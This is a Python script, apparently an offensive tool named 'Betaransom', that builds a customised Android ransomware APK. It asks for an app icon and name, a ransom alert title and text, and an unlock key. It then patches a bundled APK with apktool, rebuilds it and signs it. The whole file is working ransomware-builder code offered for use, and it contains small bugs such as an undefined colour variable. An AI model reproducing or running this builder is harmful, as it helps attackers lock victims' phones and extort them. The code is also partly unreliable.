#! /usr/bin/env python3
import os, sys, time, fileinput
from getpass import getpass
from PIL import Image

re = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
d = "\033[2;37m"
R = "\033[1;41m"
Y = "\033[1;43m"
B = "\033[1;44m"
w = "\033[0m"

app_icon = ""
app_name = ""
alert_title = ""
alert_desc = ""
key_pass = ""

def banner():
    print(re+"                            -+/`                                      .:hs/`                        ")
    print(re+"                         -odmNNmho.                                 -ydmmNNmy/`          ")           
    print(re+"                      `/hmNNNo::-`                                    ```oNNNNdo.                ")   
    print(re+"                    `+dNNNNNN:                                           oNNNNNNms.               ")  
    print(re+"                  `+dNNNNNNNNo                `:s+`                      dNNNNNNNNmo.         ")      
    print(re+"                 :hNNNNNNNNNNd`             `-/:oNh-                    :NNNNNNNNNNNd/          ")    
    print(re+"               `omNNNNNNNNNNNNo             ./mNmNNmh+-`               `dNNNNNNNNNNNNNs`            ")
    print(re+"              `yNNNNNNNNNNNNNNN:           .+mNNNNNNNNdh-             `yNNNNNNNNNNNNNNNy`        ")   
    print(re+"             `yNNNNNNNNNNNNNNNNm-           oNNNNmNNNNdmd.           `sNNNNNNNNNNNNNNNNNy`          ")
    print(re+"             sNNNNNNNNNNNNNNNNNNm:          dNNNmymNmNNNNd/         `yNNNNNNNNNNNNNNNNNNNs        ")  
    print(re+"            +NNNNNNNNNNNNNNNNNNNNmo`        mNNNN++y-hmmdNmy-     `/dNNNNNNNNNNNNNNNNNNNNN/         ")
    print(re+"           `mNNNNNNNNNNNNNNNNNNNNNNd/`      yNNNNh.`  /mmhhm:    :hNNNNNNNNNNNNNNNNNNNNNNNd`        ")
    print(re+"           +NNNNNNNNNNNNNNNNNNNNNNNNNh/`    :NNNNNo    -mN:/  `:yNNNNNNNNNNNNNNNNNNNNNNNNNN:        ")
    print(re+"           sNNNNNNNNNNNNNNNNNNNNNNNNNNNh+.   yNNNNN/    ./-`.+hNNNNNNNNNNNNNNNNNNNNNNNNNNNN+       ") 
    print(re+"           hNNNNNNNNNNNNNNNNNNNNNNNNNNNNNms-`.dNNNNN+`  `-ohNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNo        ")
    print(re+"           yNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNdymNNNNNNhyydNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN/        ")
    print(re+"           +NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN.        ")
    print(re+"           -NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmNNNNNNNNNNhhmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNd           ")
    print(re+"            dNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNs--mNNNNNNNNs  -mNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNo                  ")
    print(re+"            /NNNNNNNNNNNNNNNNNNNNNNNNNNNNNo   dNNNNNNNNd.  :NNNNNNNNNNNNNNNNNNNNNNNNNNNNNm`                      ")
    print(re+"             dNNNNNNNNNNNNNNNNNNNhhdNNNNNN`  :NNNNNNNNNNd.  yNNNNmyo+sdNNNNNNNNNNNNNNNNNNo                              ")
    print(re+"             :NNNNNNNNNNNNNNNNNd.   `/hNNm   yNNNNNNNNNNNd. .NNm/`    `dNNNNNNNNNNNNNNNNd`                                       ")
    print(re+"              sNNNNNNNNNNNNNNNN/       :mm   hNNNNNNNNNNNNh  hm-       sNNmddNNNNNNNNNNm-                                                  ")
    print(re+"              `hNNNNNNNd+:..:yN+        .d-  sNNNNNNNNNNNNN/ os        yh:`  `:hNNNNNNN/                                                       ")
    print(re+"               `hNNNNNy`      -o`        `+  .mNNNNNNNNNNNNd -/       .:       `mNNNNN/                                         ")
    print(re+"                `sNNNN/         `         .-  :NNNNNNNNNNNNN `-                 hNNNd-                                                  ")
    print(re+"                  +mNNo                    .`  sNNNNNNNNNNNm  -                `mNNy.                                                      ")
    print(re+"                   -dNm.                       +NNNNNNNNNNNy                   +Nm+`                                                       ")
    print(re+"                    `+dh`                    `/mNNNNNNNNNNm-                  /mo.                                                     ")
    print(re+"                      `+s.               `-/sdNNNNNNNNNNNm:                 `:o.                                                            ")
    print(re+"                        `--.         `-+ydmNNNNNNNNNNNNds.                 --`                                                      ")
    print(re+"                          ``       .+hmNNNNNNNNNNNmdhs/.                   `                                                     ")
    print(re+"                                  /dNNNNNNNNmdyo/-..`                                                                                  ")
    print(re+"                                `sNNNNNNNds:.`                                                                                        ")
    print(re+"                               -sNNNNNNd/`          ``     ``....``                                                               ")
    print(re+"                             .smNNNNNNh.          `/d+:/++osssyyhdhy+-`                                                ")
    print(re+"                            .dNNNNNNNd`       ``./ody/:-.``    `.:sNNNh:                                           ")
    print(re+"                            +omNNNNNNh       ....` `               yNNNm                                                ")
    print(re+"                            : dNNNNNNN+`                         `-dNNNh                                            ")
    print(re+"                              dyhNNNNNNms/.`                 `.:ohNNNNd.                                           ")
    print(re+"                              + `+dNNNNNNNNdys+:-..```..-:/oyhmNNNNmh/`                                 ")
    print(re+"                                  `+NNNNNNNNNNNNNNNNNNNNNNNNNNNmmy+-                          ")      
    print(re+"                                    :dNs+oshdmmmNNNNNNNNNNmmds+-`                                            ")
    print(re+"                                      ::.     `--::////::-.                                                                                 ")
    print(g+"                             ____       _")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
    print(g+                          "| __ )  ___| |_ __ _ _ __ __ _ _ __  ___  ___  _ __ ___") 
    print(g+"                          |  _ \ / _ \ __/ _` | '__/ _` | '_ \/ __|/ _ \| '_ ` _ \  ")
    print(g+"                          | |_) |  __/ || (_| | | | (_| | | | \__ \ (_) | | | | | |")
    print(g+"                          |____/ \___|\__\__,_|_|  \__,_|_| |_|___/\___/|_| |_| |_|") 
    print(re+"                                                 Version: 2.0                                                         ")
    print(g+"                      Tool created By Ahadu Eyasu   ")
    print(re+"      ===================================================================================================")                                                                                                                                                                                                        
def writefile(file,old,new):
    while True:
        if os.path.isfile(file):
            replaces = {old:new}
            for line in fileinput.input(file, inplace=True):
                for search in replaces:
                    replaced = replaces[search]
                    line = line.replace(search,replaced)
                print(line, end="")
            break
        else: exit(r+"[!]"+w+" Failed to write in file "+file)

def start():
    global app_icon, app_name, alert_title, alert_desc, key_pass
    os.system("clear")
    banner()
    print(r+"[!]"+w+" Are you sure you want to use this tool.")
    ask = str(input(r+"[!]"+w+"Type y if you want and n if you dont want to use it (y/n): ").lower())
    if ask in ("yes"): pass
    else: exit(r+"[!]"+w+" Well you are good person I guess !")
    print(f"""
    {r}Betaransom{w} is a Android device ransomware attack
    {w}The user can customize the App Icon, Name, Key and others.
    {d}If you forgot the unlock key, reverse enginneer it nor reset your phone number !{w}
    """)
    print(b+"> "+w+os.popen("curl ifconfig.co/city --silent").readline().strip()+", "+os.popen("curl ifconfig.co/country --silent").readline().rstrip()+time.strftime(", %d/%m/%Y (%H.%M.%S)"))
    print(b+">"+w+" Use \\n for newline and CTRL + C for exit")
    print(w+"-"*43)
    while True:
        x = str(input(w+"* set your app_icon (PNG format only): "+g))
        if os.path.isfile(x):
            if ".png" in x:
                app_icon = x
                break
            else: print(r+"[!]"+w+" File not accepted, PNG format only !")
        else: print(r+"[!]"+w+" File not found, please full fill it correctly !")
    while True:
        x = str(input(w+"* set your app_name: "+g))
        if len(x) != 0:
            app_name = x
            break
        else: continue
    while True:
        x = str(input(w+"* set your title: "+g))
        if len(x) != 0:
            alert_title = x
            break
        else: continue
    while True:
        x = str(input(w+"* set your description: "+g))
        if len(x) != 0:
            alert_desc = x
            break
        else: continue
    while True:
        x = str(input(w+"* set your ransom unlock key: "+g))
        if len(x) != 0:
            key_pass = x
            break
        else: continue
    print(w+"* Building your ransomware APK's ...")
    print(w+"-"*43+d)
    os.system("apktool d beta.apk")
    imgpath = [
        "beta/res/drawable-mdpi-v4/ic_launcher.png",
        "beta/res/drawable-xhdpi-v4/ic_launcher.png",
        "beta/res/drawable-hdpi-v4/ic_launcher.png",
        "beta/res/drawable-xxhdpi-v4/ic_launcher.png",
    ]
    strings = "beta/res/values/strings.xml"
    print("I: Using strings "+strings)
    smali = os.popen(f"find -L beta/ -name '*0000.smali'","r").readline().strip()
    print("I: Using smali "+os.path.basename(smali))
    writefile(strings,"appname",app_name)
    print("I: Adding name with "+app_name)
    writefile(strings,"alert_title",alert_title)
    print("I: Adding title with "+alert_title)
    writefile(strings,"alert_desc",alert_desc)
    print("I: Adding description with "+str(len(alert_desc))+" words")
    writefile(smali,"key_pass",key_pass)
    print("I: Adding unlock key with "+key_pass)
    time.sleep(3)
    for path in imgpath:
        if os.path.isfile(path):
            with Image.open(path) as target:
                width, height = target.size
                size = str(width)+"x"+str(height)
                logo = os.path.basename(app_icon)
                os.system("cp -R "+app_icon+" "+logo)
                os.system("mogrify -resize "+size+" "+logo+";cp -R "+logo+" "+path)
                os.system("rm -rf "+logo)
                print("I: Adding icon with "+os.path.basename(app_icon)+" size: "+size)
        else: exit(1)
    os.system("apktool b beta -o final.apk;rm -rf beta")
    os.system("java -jar ubersigner.jar -a final.apk --ks debug.jks --ksAlias debugging --ksPass debugging --ksKeyPass debugging > /dev/null 2>&1")
    os.system("java -jar ubersigner.jar -a final.apk --onlyVerify > /dev/null 2>&1")
    os.system("rm -rf final.apk")
    if os.path.isfile("final-aligned-signed.apk"):
        out = app_name.replace(" ","").lower() + ".apk"
        os.system("mv final-aligned-signed.apk "+out)
        getpass(b+">"+w+" Result saved as: "+B+" "+out+" "+w)
    else: print(r+"[!]"+w+" Failed to signed APK's")

if __name__ == "__main__":
    try:
        start()
    except KeyboardInterrupt:
        exit(r+"\n[!]"+w+" Thanks for Using this tool Alpha always wins\n ")